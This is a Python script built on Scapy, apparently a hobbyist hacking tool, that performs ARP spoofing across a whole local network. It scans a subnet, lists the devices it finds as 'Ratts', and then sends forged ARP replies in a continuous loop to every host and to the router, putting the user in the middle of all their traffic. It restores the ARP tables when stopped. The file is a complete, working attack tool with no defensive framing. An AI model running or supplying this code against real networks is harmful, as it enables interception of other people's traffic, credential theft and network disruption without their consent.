import os
import time
from scapy.all import ARP, Ether, srp, send

# Terminali temizleme fonksiyonu
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Banner
def show_banner():
    banner = r"""
       _____ ____________________    ___________________________   ________  ___________
      /  _  \\______   \______   \  /   _____/\______   \_____  \  \_____  \ \_   _____/
     /  /_\  \|       _/|     ___/  \_____  \  |     ___//   |   \  /   |   \ |    __)  
    /    |    \    |   \|    |      /        \ |    |   /    |    \/    |    \|     \   
    \____|__  /____|_  /|____|     /_______  / |____|   \_______  /\_______  /\___  /   
            \/       \/                    \/                   \/         \/     \/    
        
                   ARP SPOOFER | Whole LocalNetwork Mode
                   DO NOT FORGET THIS SCRIPT ONLY WORK ON LOCAL NETWORK [!]
    """
    print(banner)

def scan_network(network_range):
    print(f"[+] {network_range} SCAN NETWROOK.\n")
    arp_request = ARP(pdst=network_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list, _ = srp(arp_request_broadcast, timeout=2, verbose=False)

    devices = []
    for answer in answered_list:
        devices.append({"ip": answer[1].psrc, "mac": answer[1].hwsrc})
    
    return devices
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    response, _ = srp(arp_request_broadcast, timeout=2, verbose=False)
    if response:
        return response[0][1].hwsrc
    return None
def spoof(target_ip, target_mac, spoof_ip):
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, verbose=False)
def restore(target_ip, target_mac, spoof_ip, spoof_mac):
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(arp_response, verbose=False, count=4)
if __name__ == "__main__":
    clear_screen()
    show_banner()

    router_ip = input("🌐 Router IP (192.168.1.1): ")
    network_range = input("🔍 IP but Range (ör: 192.168.1.1/24): ")

    # Ağı tarayarak tüm cihazları bul
    devices = scan_network(network_range)
    
    if len(devices) == 0:
        print("[!] Cant Find Any! Exit !")
        exit()

    print("\n🎯 Ratts :D ")
    for device in devices:
        print(f" - {device['ip']} [{device['mac']}]")
    
    router_mac = None
    for device in devices:
        if device["ip"] == router_ip:
            router_mac = device["mac"]
    
    if not router_mac:
        print("\n[!] Cant get MAC exit...")
        exit()

    try:
        print("\n[+] Started ARP Spoof for whole local! U can stop with CTRL+C...\n")
        while True:
            for device in devices:
                if device["ip"] != router_ip:  # Routerabisenkal
                    spoof(device["ip"], device["mac"], router_ip)
                    spoof(router_ip, router_mac, device["ip"])
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopping Arp...")
        for device in devices:
            if device["ip"] != router_ip:
                restore(device["ip"], device["mac"], router_ip, router_mac)
                restore(router_ip, router_mac, device["ip"], device["mac"])

        print("[+] Normalized Network.")
